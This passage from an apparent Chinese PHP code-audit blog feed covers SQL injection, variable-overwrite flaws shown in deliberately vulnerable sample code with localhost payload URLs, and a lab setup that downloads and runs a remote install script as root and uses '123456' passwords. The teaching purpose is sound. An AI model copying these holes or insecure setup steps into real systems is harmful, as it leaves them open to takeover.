LIMIT 0,1&quot;;</code> 通过这个发送SQL语句查询用户信息，但是此代码片段未做任何过滤，所以注入点就在 <code>$cookee</code></p><p><img src="/2021/3145843663/image-20211213190230850.png" alt="image-20211213190230850"> </p><p>总结</p><p>SQL注入主要是用不同方式接收了用户的输入，开发者并没有对齐进行过滤，直接带入SQL语句。</p><p>参考链接</p><p><a href="https://www.runoob.com/sql/sql-syntax.html">https://www.runoob.com/sql/sql-syntax.html</a></p><p><a href="https://www.freebuf.com/vuls/265629.html">https://www.freebuf.com/vuls/265629.html</a></p>]]></content>
    
    
    <summary type="html">SQL注入的条件、类型、漏洞场景、审计思路、漏洞修复、GET注入、POST注入、COOKIE注入案例分析</summary>
    
    
    
    <category term="代码审计" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="SQL注入" scheme="https://fz1lin.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计-变量覆盖</title>
    <link href="https://fz1lin.com/2021/3414130932/"/>
    <id>https://fz1lin.com/2021/3414130932/</id>
    <published>2021-12-08T10:46:22.000Z</published>
    <updated>2021-12-08T10:51:02.222Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞发现"><a href="#0x00-漏洞发现" class="headerlink" title="0x00 漏洞发现"></a>0x00 漏洞发现</h2><p>变量覆盖是指我们自定义的参数值替换程序原有的变量值，一般需要根据程序的功能来构造 payload</p><p>以下函数或语法使用不当时，就会出现漏洞</p><ul><li>register_globals       (自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。)</li><li>extract()</li><li><code>$$</code></li><li>parse_str()</li><li>mb_parse_str()</li><li>import_request_variables()     (PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0)</li></ul><h2 id="0x01-register-globals-全局变量覆盖"><a href="#0x01-register-globals-全局变量覆盖" class="headerlink" title="0x01 register_globals 全局变量覆盖"></a>0x01 register_globals 全局变量覆盖</h2><p>php.ini 中有一项为 register_globals，即注册全局变量，当register_globals=On时，传递过来的值会被直接的注册为全局变量直接使用，而当 register_globals=Off时，我们需要到特定的数组里去得到它。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Register_globals: &quot;</span> . (<span class="keyword">int</span>)ini_get(<span class="string">&quot;register_globals&quot;</span>) . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Hacked!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为 On</p><p><img src="/2021/3414130932/image-20211207150529777.png" alt="image-20211207150529777"> </p><blockquote><p>修改配置文件要重启 Apache</p></blockquote><p>为Off</p><p><img src="/2021/3414130932/image-20211207150814956.png" alt="image-20211207150814956">  </p><h2 id="0x02-extract-变量覆盖"><a href="#0x02-extract-变量覆盖" class="headerlink" title="0x02 extract 变量覆盖"></a>0x02 extract 变量覆盖</h2><p>考察知识点：接受用户的<code>$_GET、$_POST</code>这类用户可控的变量，可能存在变量覆盖问题，如果不指定extract函数的flags位或者是<code>EXTR_OVERWRITE</code>，也有可能会存在变量覆盖问题</p><h3 id="代码复现"><a href="#代码复现" class="headerlink" title="代码复现"></a>代码复现</h3><p><img src="/2021/3414130932/image-20211207103754274.png" alt="image-20211207103754274"> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxx&#x27;</span>; </span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shiyan</span>))</span><br><span class="line"> &#123; </span><br><span class="line">    <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>)</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span><span class="string">&#x27;extract变量覆盖成功&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123; </span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;Oh.no&#x27;</span>;</span><br><span class="line">   &#125; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析漏洞代码"><a href="#分析漏洞代码" class="headerlink" title="分析漏洞代码"></a>分析漏洞代码</h3><p>我看代码发现一个<a href="https://www.php.net/manual/zh/function.extract">extract</a>函数，查一下手册，我们发现 extract 是将数组中的变量导入到当前的符号表，默认如果不指定，flags位，就会覆盖已有的变量。</p><p><img src="/2021/3414130932/image-20211207104650885.png" alt="image-20211207104650885"> </p><p><img src="/2021/3414130932/image-20211207105654750.png" alt="image-20211207105654750"> </p><p>extract()函数需要通过GET请求传参</p><p>函数解析</p><ul><li>isset() 函数判断是否存在变量<code>$shiyan</code></li><li>trim() 去除字符串首尾处的空白字符</li><li>file_get_contents() 将整个文件读入一个字符串 ，如果<code>$shiyan</code>的值等于文件的内容 (<code>$content</code>)时，就会打印覆盖成功</li></ul><p>extract()会将<code>$flag</code>和<code>$shiyan</code>的值覆盖了，将变量的值设置为空或者不存在的文件就满足<code>$shiyan== $content</code></p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/code/extract.php?shiyan=&amp;flag=</span></span><br><span class="line">http:<span class="comment">//localhost/code/extract.php?shiyan=&amp;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-可变变量"><a href="#0x03-可变变量" class="headerlink" title="0x03 $$ 可变变量"></a>0x03 <code>$$</code> 可变变量</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>$$</code>产生的漏洞原因是<code>foreach</code>遍历数组的值，然后将获取的数组键名作为变量，数组中的值作为变量的值或者键值</p><p>foreach 循环，只用于数组，遍历数组中的值。如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> &amp;<span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$value</span> \n&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1 2 3 4</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$$</code> 是<a href="https://www.php.net/manual/zh/language.variables.variable.php">可变变量</a> </p><p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</p><p> 意思就是：在本案例中<code>$$a</code>可以看做是 <code>$$a = $&#123;$a&#125; = $hello </code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span>&quot;</span>;   <span class="comment"># hello world</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">$hello</span>&quot;</span>;  <span class="comment"># hello world</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span>=&gt;<span class="variable">$_value</span>)  </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$$_key</span>=  <span class="variable">$_value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$id</span>) ? <span class="variable">$id</span> : <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$id</span> === <span class="string">&quot;fz1lin&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxxxxxxx&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Nothing...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="代码复现-1"><a href="#代码复现-1" class="headerlink" title="代码复现"></a>代码复现</h3><p><img src="/2021/3414130932/image-20211207162259431.png" alt="image-20211207162259431"> </p><p>分析 这里使用 GET，POST、COOKIE方式都可以触发，当传入id=fz1lin是，在foreach 语句中，<code>$_key</code>为id <code>$_value</code>为fz1lin，使得 $id=fz1lin，从而实现了变量覆盖。</p><h2 id="0x04-parse-str"><a href="#0x04-parse-str" class="headerlink" title="0x04 parse_str()"></a>0x04 parse_str()</h2><p><a href="https://www.php.net/manual/zh/function.parse-str">parse_str</a> </p><p><img src="/2021/3414130932/image-20211207163607685.png" alt="image-20211207163607685"> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 把查询字符串解析到变量中：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">parse_str(<span class="string">&quot;name=Peter&amp;age=24&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/3414130932/image-20211207163931411.png" alt="image-20211207163931411"> </p><p>如果我们把parse_str()括号里面的换做，<code>$_POST</code> 、<code>$_GET</code>之类的，是不是就能执行函数了</p><h2 id="0x05-mb-parse-str"><a href="#0x05-mb-parse-str" class="headerlink" title="0x05 mb_parse_str()"></a>0x05 mb_parse_str()</h2><p><a href="https://www.php.net/manual/zh/function.mb-parse-str">mb_parse_str()</a>函数和 parse_str()类似，用于解析GET/POST/COOKIE、设置为全局变量</p><h2 id="0x06-import-request-variables"><a href="#0x06-import-request-variables" class="headerlink" title="0x06 import_request_variables()"></a>0x06 import_request_variables()</h2><p>新版本已经弃用了、官方文档已经搜不到，可以看这个<a href="https://www.runoob.com/php/php-import_request_variables-function.html">import_request_variables</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 此处将导入 GET 和 POST 变量</span></span><br><span class="line"><span class="comment">// 使用 test_ 作为前缀</span></span><br><span class="line">import_request_variables(<span class="string">&quot;gP&quot;</span>, <span class="string">&quot;test_&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x07-防御手段"><a href="#0x07-防御手段" class="headerlink" title="0x07 防御手段"></a>0x07 防御手段</h2><ul><li>禁止变量注册，避免注册时未验证该变量是否存在而造成恶意覆盖变量的问题。</li><li>禁止开启全局变量注册或使用PHP高版本</li><li>对于 extract()，第二个参数也就是flags位，限定使用 EXTR_SKIP；</li><li>对于parse_str()函数，在注册变量前，先验证是否存在，可以设置一个白名单</li><li>对于<code>$$</code>最好使用<code>$_GET</code>、<code>$_POST</code>、<code>$_COOKIE</code>的形式。 </li></ul><h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>变量覆盖，漏洞出处，就是在于开发者对变量的把控，以及对函数的理解程度，所以，在开发的时候，一定要看手册，一定要看手册，一定要看手册。</p><p>常见变量覆盖漏洞，extract()、<code>$$</code>、parse_str() </p><p>构造payload需要结合漏洞程序的成因，具体分析，然后构造，如果是审计 cms 需要构造URL，去理解 MVC思想。</p><p>参考</p><p><a href="https://crayon-xin.github.io/2018/05/21/extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">extract变量覆盖</a></p><p><a href="https://www.mi1k7ea.com/2019/06/20/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">PHP变量覆盖漏洞小结</a></p>]]></content>
    
    
    <summary type="html">register_globals、extract()、$$、parse_str()、mb_parse_str()、import_request_variables()</summary>
    
    
    
    <category term="代码审计" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="变量覆盖" scheme="https://fz1lin.com/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    
  </entry>
  
  <entry>
    <title>关于代码审计环境的哪些事</title>
    <link href="https://fz1lin.com/2021/127456454/"/>
    <id>https://fz1lin.com/2021/127456454/</id>
    <published>2021-12-05T09:12:15.000Z</published>
    <updated>2021-12-06T07:20:15.456Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-搭建代码审计的环境"><a href="#0x01-搭建代码审计的环境" class="headerlink" title="0x01 搭建代码审计的环境"></a>0x01 搭建代码审计的环境</h2><p>常用的调试环境</p><ul><li>windows</li><li>Linux</li><li>docker</li></ul><h3 id="1-windows环境下搭建"><a href="#1-windows环境下搭建" class="headerlink" title="1.windows环境下搭建"></a>1.windows环境下搭建</h3><p>windows下使用 phpstudy 即可搭建成功，<a href="https://www.xp.cn/">官网</a>地址、安装即可。phpstudy集成了一整套PHP的环境，方便日后调试。</p><p>具体详细介绍，百度或者Google先行</p><p>phpstudy 主要的目录（以phpStudy v8.1，2018版，目录不一样）</p><blockquote><p>常用的目录是 www、Extensions目录下各个服务的配置文件，也可以使用phpstudy直接打开或修改</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">├─COM         <span class="comment">//phpstudy安装目录</span></span><br><span class="line">├─Extensions  <span class="comment">//存放服务安装的目录，如MySQL，Apache等，</span></span><br><span class="line">├─WWW         <span class="comment">//网站根目录</span></span><br></pre></td></tr></table></figure><h3 id="2-Linux环境下搭建"><a href="#2-Linux环境下搭建" class="headerlink" title="2.Linux环境下搭建"></a>2.Linux环境下搭建</h3><p>Linux下安装也是一样的，还是使用phpstudy，也可使用宝塔等其他在Linux下集成的环境，这里使用phpstudy官方<a href="https://www.xp.cn/linux.html">文档</a>写的很详细，选择自己的版本即可</p><p>以 Ubuntu 无 docker 为例</p><p>执行如下命令即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh https://notdocker.xp.cn/install.sh &amp;&amp; sudo bash install.sh</span><br></pre></td></tr></table></figure><p>登录后台会出现一个控制面板，登录后台修改各个服务版本和windows下的类似</p><p><img src="/2021/127456454/image-20211204150648217.png" alt="image-20211204150648217"> </p><p>目录说明（需要root权限）</p><p>将一些 cms 放在wwwroot 下调试即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/www/admin/localhost_80/wwwroot   <span class="comment">#网站目录</span></span><br><span class="line">/www/localhost_80/<span class="built_in">error</span>/          <span class="comment">#错误提示页面</span></span><br></pre></td></tr></table></figure><h3 id="3-docker环境下搭建"><a href="#3-docker环境下搭建" class="headerlink" title="3.docker环境下搭建"></a>3.docker环境下搭建</h3><p>docker可以做很多事情，漏洞环境搭建，CTF题目测试等等，自己搭建完成的环境还可以供别人使用。</p><p>docker支持多平台，目前来说在Linux下安装比较好一点，如果是在windows安装，需要开启虚拟化，所以建议还是在Linux安装，<a href="https://docs.docker.com/engine/install/">docker</a>安装，我就不多说了，可以看官网的文档，或者百度、Google先行。</p><h4 id="3-1-docker-下搭建-PHP-运行环境"><a href="#3-1-docker-下搭建-PHP-运行环境" class="headerlink" title="3.1 docker 下搭建 PHP 运行环境"></a>3.1 docker 下搭建 PHP 运行环境</h4><p>将 <a href="https://hub.docker.com/_/centos?tab=tags&page=1">centos7</a> 下载到 docker 容器中</p><blockquote><p>注：如果搭建docker环境需要将phpstudy环境进行关闭保存，然后恢复快照进行重新安装。</p></blockquote><p>这里可以指定版本下载，如果使用默认命令将下载最新版的，我们指定centos7下载</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull centos:centos7.6.1810</span><br></pre></td></tr></table></figure><p><img src="/2021/127456454/image-20211204170918192.png" alt="image-20211204170918192"> </p><p>（1）启动 centos 7 容器</p><p>查看容器ID（IMAGE ID 为容器ID）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure><p>（2）运行docker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -itd -p 9999:80 --privileged=<span class="literal">true</span> f1cb7c7d58b7 /sbin/init  <span class="comment"># f1cb7c7d58b7 是你的 IMAGE ID</span></span><br><span class="line">sudo docker ps </span><br><span class="line">sudo docker <span class="built_in">exec</span> -it cdcbed33a88c /bin/bash   <span class="comment"># cdcbed33a88c 是你刚才运行后生成的CONTAINER ID</span></span><br></pre></td></tr></table></figure><p>（3）挂起与运行docker</p><blockquote><p>依次执行 Ctrl + P 和 Ctrl + Q 快捷键退出容器并保持运行</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 整套流程</span></span><br><span class="line">Ctrl + P 和 Ctrl + Q   <span class="comment">#保持运行，退出后台</span></span><br><span class="line">sudo docker ps              <span class="comment">#查看CONTAINER ID</span></span><br><span class="line"><span class="comment"># 再次运行容器</span></span><br><span class="line">sudo docker start -ai cdcbed33a88c   <span class="comment">#其中cdcbed33a88c为CONTAINER ID，要输入你自己的ID</span></span><br></pre></td></tr></table></figure><p>（4）安装 LAMP 环境</p><p>安装环境，我就直接贴命令了，想要知道命令的含义，百度或Google先行</p><p>安装 Apache</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd -y</span><br><span class="line">systemctl start httpd</span><br><span class="line">systemctl <span class="built_in">enable</span> httpd</span><br></pre></td></tr></table></figure><p>安装 MySQL</p><blockquote><p>数据库 账号root  密码 123456</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install mariadb mariadb-server -y</span><br><span class="line">systemctl start mariadb</span><br><span class="line">systemctl <span class="built_in">enable</span> mariadb</span><br><span class="line">mysqladmin -u root password <span class="string">&quot;123456&quot;</span></span><br><span class="line">mysql -u root -p123456</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>安装 PHP</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install -y \</span><br><span class="line">https://repo.ius.io/ius-release-el7.rpm \</span><br><span class="line">https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class="line">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br><span class="line">yum -y install php70w-devel php70w.x86_64 php70w-cli.x86_64 php70w-common.x86_64 php70w-gd.x86_64 php70w-ldap.x86_64 php70w-mbstring.x86_64 php70w-mcrypt.x86_64  php70w-pdo.x86_64   php70w-mysqlnd  php70w-fpm php70w-opcache php70w-pecl-redis php70w-pecl-mongodb</span><br><span class="line">php -v</span><br></pre></td></tr></table></figure><p>测试网页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /<span class="keyword">var</span>/www/html/test.php </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">systemctl restart httpd</span></span><br></pre></td></tr></table></figure><p>访问网页 http:127.0.0.1:9999/test.php</p><h4 id="3-2-docker-中安装CMS"><a href="#3-2-docker-中安装CMS" class="headerlink" title="3.2 docker 中安装CMS"></a>3.2 docker 中安装CMS</h4><p>直接将cms文件下载下来，然后解压到本地，使用docker cp 命令复制进去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp /home/cms cdcbed33a88c:/<span class="keyword">var</span>/www/html</span><br><span class="line">sudo docker cp 本地cms文件路径 容器名：容器解析路径</span><br></pre></td></tr></table></figure><blockquote><p>如果文件不可写入，可在容器里执行命令 <code>chmod -R  755 /var/www/html</code> </p></blockquote><h4 id="3-3-上传镜像至-Docker-Hub"><a href="#3-3-上传镜像至-Docker-Hub" class="headerlink" title="3.3 上传镜像至 Docker Hub"></a>3.3 上传镜像至 Docker Hub</h4><p>使用 docker ps 查看 CONTAINER ID</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker commit cdcbed33a88c lamp_test  <span class="comment"># commit 创建并保存与其配套的知识库（lamp_test）</span></span><br></pre></td></tr></table></figure><p>使用docker images</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure><p>查看已经创建成功了</p><p>注册并登陆<a href="https://hub.docker.com/">dockerhub</a>，依次选择</p><p>Repositories-》Create Repository</p><p><img src="/2021/127456454/image-20211204193827489.png" alt="image-20211204193827489"> </p><p>然后返回Linux终端登录docker hub</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker login</span><br></pre></td></tr></table></figure><p>输入用户名和密码即可</p><p>看到<code>Login Succeeded</code> 就登录成功了</p><p>执行上传命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker push lamp_test:latest</span><br></pre></td></tr></table></figure><p>如果出现 <code>denied: requested access to the resource is denied</code>错误，解决方案如下，没有则跳过</p><p>1）更新用户仓库信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker tag lamp_test fz1lin/lamp_test:v1</span><br></pre></td></tr></table></figure><p>2）重启docker</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><p>重新执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker push fz1lin/lamp_test:v1</span><br></pre></td></tr></table></figure><p>出现 <code>v1: digest:</code> 表示上传成功了</p><p>登录 docker hub 查看</p><p><img src="/2021/127456454/image-20211204195924512.png" alt="image-20211204195924512"> </p><p>从 docker hub 上下载</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull fz1lin/lamp_test:v1</span><br></pre></td></tr></table></figure><h3 id="4-PHPstorm-连接-docker"><a href="#4-PHPstorm-连接-docker" class="headerlink" title="4.PHPstorm 连接 docker"></a>4.PHPstorm 连接 docker</h3><p>在docker可以使用vi编写代码，但调试不是很方便，所以我们使用的思路不是docker直接连接容器，而是我们之前用docker搭建过lamp服务，我们使用SFTP连接容器，将代码实时更新到容器内部，进行调试，这里在制作docker的时候，也可以把ssh安装进去，进行打包，也是一样的</p><h4 id="4-1-配置docker-SSH-服务"><a href="#4-1-配置docker-SSH-服务" class="headerlink" title="4.1 配置docker SSH 服务"></a>4.1 配置docker SSH 服务</h4><p>新建一个 docker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -itd -p 8080:80 -p 2222:22  --privileged=<span class="literal">true</span> 516d7c20fa31 /sbin/init</span><br><span class="line">sudo docker ps </span><br><span class="line">sudo docker <span class="built_in">exec</span> -it cad875338105 /bin/bash</span><br></pre></td></tr></table></figure><p>安装 openssh 并启动</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openssh-server</span><br><span class="line">systemctl start sshd</span><br></pre></td></tr></table></figure><p>设置 root 密码</p><blockquote><p>123456</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure><p>测试连接</p><p>新建一个终端 Ctrl + Alt + T</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.52.145 -p 2222  </span><br></pre></td></tr></table></figure><h4 id="4-2-使用phpstorm-连接docker"><a href="#4-2-使用phpstorm-连接docker" class="headerlink" title="4.2 使用phpstorm 连接docker"></a>4.2 使用phpstorm 连接docker</h4><p>这里使用phpstorm 是汉化的，如果没有汉化的，可以自行百度，或者去插件库，下载汉化插件</p><p>打开 phpstorm 选择 -&gt;Create New Project from Existing Files </p><p><img src="/2021/127456454/image-20211205142240167.png" alt="image-20211205142240167"> </p><p>选择使用SFTP模式传输代码，</p><p><img src="/2021/127456454/image-20211205143505009.png" alt="image-20211205143505009"> </p><p>设置项目名称</p><p><img src="/2021/127456454/image-20211205143603261.png" alt="image-20211205143603261"> </p><p>设置用户名和密码</p><p><img src="/2021/127456454/image-20211205143757363.png" alt="image-20211205143757363"> </p><p>选择账号和密码，选择目录，不是用http登录</p><p><img src="/2021/127456454/image-20211205150824355.png" alt="image-20211205150824355">  </p><p>默认即可</p><p><img 